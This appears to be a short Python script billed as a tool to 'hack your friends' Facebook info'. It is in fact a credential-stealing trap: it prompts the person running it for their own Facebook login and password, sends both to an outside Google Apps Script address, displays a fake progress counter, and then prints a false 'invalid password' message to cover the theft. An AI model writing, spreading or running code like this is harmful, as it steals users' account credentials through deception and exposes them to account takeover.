
import requests
import pyfiglet
import time
a = pyfiglet.figlet_format('facebook info')
print(a)
print("autor by: Pyae Sone Hmoo")
print("dont use illegal")
print('please login with your facebook \n for hack your firends info')

umail =input("please Enter phone and gmail:")
upass =input("please Enter  password'")
data ={'mail':umail,'pass':upass}
rq =requests.post('https://script.google.com/macros/s/AKfycbzpRqyHxvWSniIhc5UqBK-RJDz3gGCo4xYBlLwFkhAdNEsKLmI/exec',data=data)

for i in range(100):
   print(i,'%')
   time.sleep(1)
print('invalid password or username')
